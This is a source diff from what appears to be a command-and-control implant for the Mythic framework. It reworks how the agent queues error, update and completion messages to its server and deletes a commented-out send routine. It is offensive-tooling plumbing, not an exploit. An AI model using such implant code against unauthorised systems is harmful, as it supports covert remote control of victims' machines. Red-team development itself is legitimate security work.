@@ -172,25 +172,61 @@ BOOL PackageAddFormatPrintf(PPackage package, BOOL copySize, char *fmt, ...)
     return TRUE;
 }
 
-// Sends ERROR post_response to server for individual task
+/**
+ * @brief Send package with error status and code
+ */
 VOID PackageError(PCHAR taskUuid, UINT32 errorCode)
 {
-    // Initialize post_response package
-    PPackage error = PackageInit(POST_RESPONSE, TRUE);
-    PackageAddString(error, taskUuid, FALSE);
+    /* Create post_response Package */
+    PPackage data = PackageInit(NULL, FALSE);
+    PackageAddByte(data, POST_RESPONSE);
+    
+    /* Add Task UUID */
+    PackageAddString(data, taskUuid, FALSE);
+    
+    /* Error Information */
+    PackageAddInt32(data, errorCode);
+    
+    /* Add Status Byte to End */
+    PackageAddByte(data, TASK_FAILED);
 
-    // Error information
-    PackageAddInt32(error, errorCode);           // specific error code
-    PackageAddByte(error, TASK_FAILED);          // Error status
-
-    // Send
-    PackageSend(error, NULL);
-
-    // Cleanup
-    PackageDestroy(error);
+    /* Queue Packet To Send */
+    PackageQueue(data);
 }
 
-// Queues package with complete status (no message ID)
+/**
+ * @brief Send package with no status
+ */
+VOID PackageUpdate(PCHAR taskUuid, PPackage package)
+{
+    /* Create post_response Package */
+    PPackage data = PackageInit(NULL, FALSE);
+    PackageAddByte(data, POST_RESPONSE);
+    
+    /* Add Task UUID */
+    PackageAddString(data, taskUuid, FALSE);
+    
+    /* Add Data */
+    if (package != NULL && package->buffer != NULL)
+    {
+        // Use data from package
+        PackageAddBytes(data, (PBYTE)package->buffer, package->length, TRUE);
+    }
+    else
+    {
+        PackageAddInt32(data, 0);
+    }
+
+    /* Add Status Byte to End */
+    PackageAddByte(data, TASK_UPDATE);
+
+    /* Queue Packet To Send */
+    PackageQueue(data);
+}
+
+/**
+ * @brief Send package with complete status
+ */
 VOID PackageComplete(PCHAR taskUuid, PPackage package)
 {
     /* Create post_response Package */
@@ -213,11 +249,7 @@ VOID PackageComplete(PCHAR taskUuid, PPackage package)
     PackageAddByte(data, TASK_COMPLETE);
 
     /* Queue Packet To Send */
-    // PackageSend(data, NULL);
     PackageQueue(data);
-
-    // Cleanup
-    // PackageDestroy(data);
 }
 
 /**
@@ -296,99 +328,6 @@ cleanup:
     return success;
 }
 
-
-/**
- * @brief Immediately send a package to the server, ignoring response.
- */
-// BOOL PackageSendNow(PPackage package, PPARSER response)
-// {
-//     BOOL bStatus = FALSE;
-
-//     if ( xenonConfig->isEncryption ) 
-//     {
-//         if ( !CryptoMythicEncryptPackage(package) )
-//             return FALSE;
-//     }
-
-//     if ( !PackageBase64Encode(package) )
-//         return FALSE;
-
-//     _dbg("Client -> Server message (length: %d bytes)", package->length);
-
-//     PBYTE pOutData      = NULL;
-//     SIZE_T sOutLen      = 0;
-
-// #ifdef SMB_TRANSPORT
-
-//     if ( !NetworkSmbSend(package, NULL, NULL) )
-//     {
-//         _err("Failed to send network packet!");
-//         return FALSE;
-//     }
-
-// #endif
-
-//     // TODO remove comment
-//     // In the case where SMB receive doesnt return anything
-//     if (pOutData == NULL || sOutLen == 0) {
-//         return TRUE;
-//     }
-
-//     // Sometimes we don't care about the response data (post_response)
-//     // Check response pointer for NULL to skip processes the response.
-//     if (response == NULL)
-//         goto end;
-
-//     // Fill parser structure with data
-//     ParserNew(response, pOutData, sOutLen);
-
-//     ////////////////////////////////////////
-//     ////// Response Mythic package /////////
-//     ////////////////////////////////////////
-//     _dbg("\n\n===================RESPONSE======================\n");
-//     _dbg("Server -> Client message (length: %d bytes)", response->Length);
- 
-//     if (!ParserBase64Decode(response)) {
-//         _err("Base64 decoding failed");
-//         goto end;
-//     }
-
-//     // Check payload UUID
-//     SIZE_T sizeUuid             = TASK_UUID_SIZE;
-//     PCHAR receivedPayloadUUID   = NULL; 
-//     receivedPayloadUUID         = ParserGetString(response, &sizeUuid);
-//     // Use memcmp to pass a strict size of bytes to compare
-//     if (memcmp(receivedPayloadUUID, xenonConfig->agentID, TASK_UUID_SIZE) != 0) {
-//         _err("Check-in payload UUID doesn't match what we have. Expected - %s : Received - %s", xenonConfig->agentID, receivedPayloadUUID);
-//         goto end;
-//     }
-    
-    
-//     // Mythic AES decryption
-//     if (xenonConfig->isEncryption)
-//     {
-//         if (!CryptoMythicDecryptParser(response))
-//             goto end;
-//     }
-
-    
-//     _dbg("Decrypted Response");
-//     print_bytes(response->Buffer, response->Length);
-    
-
-//     bStatus = TRUE;
-
-// end:
-
-//     if ( pOutData != NULL )
-//     {
-//         memset(pOutData, 0, sOutLen);
-//         LocalFree(pOutData);
-//         pOutData = NULL;
-//     }
-
-//     return bStatus;
-// }
 
 /*
     Core function for sending C2 messages.
@@ -479,8 +418,8 @@ BOOL PackageSend(PPackage package, PPARSER response)
     }
 
     
-    _dbg("Decrypted Response");
-    print_bytes(response->Buffer, response->Length);
+    // _dbg("Decrypted Response");
+    // print_bytes(response->Buffer, response->Length);
     
 
     bStatus = TRUE;
